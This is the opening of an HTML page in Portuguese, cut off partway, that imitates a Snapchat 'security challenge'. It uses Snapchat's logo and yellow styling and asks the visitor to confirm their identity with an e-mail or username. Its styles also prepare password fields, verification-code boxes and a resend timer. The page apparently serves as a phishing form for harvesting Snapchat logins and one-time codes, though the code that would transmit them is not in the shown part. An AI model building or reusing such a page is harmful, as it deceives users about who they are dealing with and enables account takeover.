<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Desafio de segurança</title>
  <link rel="icon" href="https://www.snapchat.com/favicon.ico" type="image/x-icon"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: 'Inter', Arial, sans-serif; background: #fff; color: #111; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .card { width: 100%; max-width: 460px; padding: 48px 36px 40px; display: flex; flex-direction: column; align-items: center; }
    .icone { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
    h1 { font-size: 1.75rem; font-weight: 700; text-align: center; margin-bottom: 8px; }
    .sub { font-size: 0.95rem; color: #555; text-align: center; margin-bottom: 32px; }
    .lbl { width: 100%; font-size: 0.85rem; font-weight: 600; color: #333; margin-bottom: 7px; }
    input[type="text"], input[type="password"] { width: 100%; border: 1.5px solid #ccc; border-radius: 8px; padding: 13px 15px; font-size: 0.95rem; font-family: inherit; color: #111; outline: none; transition: border-color .2s, box-shadow .2s; margin-bottom: 18px; }
    input[type="text"]:focus, input[type="password"]:focus { border-color: #bbb; box-shadow: 0 0 0 3px rgba(0,0,0,.07); }
    input::placeholder { color: #aaa; }
    .btn { width: 100%; padding: 14px; border: none; border-radius: 999px; background: #FFFC00; color: #111; font-family: inherit; font-size: 1rem; font-weight: 700; cursor: pointer; transition: opacity .2s, transform .15s; margin-top: 2px; }
    .btn:hover { opacity: .85; transform: translateY(-1px); }
    .btn:active { transform: translateY(0); }
    .btn:disabled { opacity: .45; cursor: not-allowed; transform: none; }
    .msg { width: 100%; margin-top: 12px; padding: 11px 14px; border-radius: 8px; font-size: .875rem; text-align: center; display: none; }
    .msg.err { background: #fff0f0; border: 1px solid #ffcccc; color: #c00; display: block; }
    .msg.ok  { background: #f0fff4; border: 1px solid #9eb; color: #070; display: block; }
    .sec { display: none; width: 100%; flex-direction: column; align-items: flex-start; }
    .sec.on { display: flex; animation: up .3s ease both; }
    @keyframes up { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
    .back { font-size: .8rem; color: #999; cursor: pointer; margin-top: 14px; width: 100%; text-align: center; }
    .back:hover { color: #555; }
    .footer { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 16px; margin-top: 44px; padding-top: 20px; border-top: 1px solid #eee; width: 100%; }
    .footer a { font-size: .75rem; color: #999; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    .ok-icon { font-size: 3rem; text-align: center; width: 100%; margin-bottom: 14px; }
    .ok-title { font-size: 1.2rem; font-weight: 700; text-align: center; width: 100%; margin-bottom: 6px; }
    .ok-sub { font-size: .9rem; color: #555; text-align: center; width: 100%; }
    .btn2 { width: 100%; padding: 13px; border: 1.5px solid #ccc; border-radius: 999px; background: #fff; color: #444; font-family: inherit; font-size: .95rem; font-weight: 600; cursor: pointer; margin-top: 22px; transition: background .2s; }
    .btn2:hover { background: #f5f5f5; }
    .code-wrap { display: flex; gap: 10px; justify-content: center; width: 100%; margin-bottom: 24px; }
    .code-box { width: 52px; height: 60px; border: 1.5px solid #ccc; border-radius: 12px; font-size: 1.5rem; font-weight: 700; text-align: center; color: #111; outline: none; font-family: inherit; transition: border-color .2s, box-shadow .2s; -moz-appearance: textfield; }
    .code-box::-webkit-outer-spin-button, .code-box::-webkit-inner-spin-button { -webkit-appearance: none; }
    .code-box:focus { border-color: #111; box-shadow: 0 0 0 3px rgba(0,0,0,.08); }
    .timer-wrap { width: 100%; text-align: center; margin-bottom: 20px; }
    .timer-text { font-size: 0.9rem; color: #888; }
    .timer-text span { font-weight: 700; color: #111; }
    .timer-text.expired span { color: #c00; }
    .resend-btn { background: none; border: none; font-family: inherit; font-size: 0.85rem; color: #0078d4; cursor: pointer; text-decoration: underline; padding: 0; }
    .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
  </style>
</head>
<body>
<div class="card">

  <img src="https://www.snapchat.com/favicon.ico" class="icone" alt="Snapchat"
       onerror="this.style.display='none'"/>

  <!-- ETAPA 1: E-mail ou usuário -->
  <div class="sec on" id="s1">
    <h1 style="width:100%">Confirme que é você</h1>
    <p class="sub" style="width:100%">Qual é o seu endereço de e-mail ou nome de usuário?</p>
    <div class="lbl">Endereço de e-mail ou nome de usuário</div>
    <input type="text" id="email" placeholder="Digite seu e-mail ou us
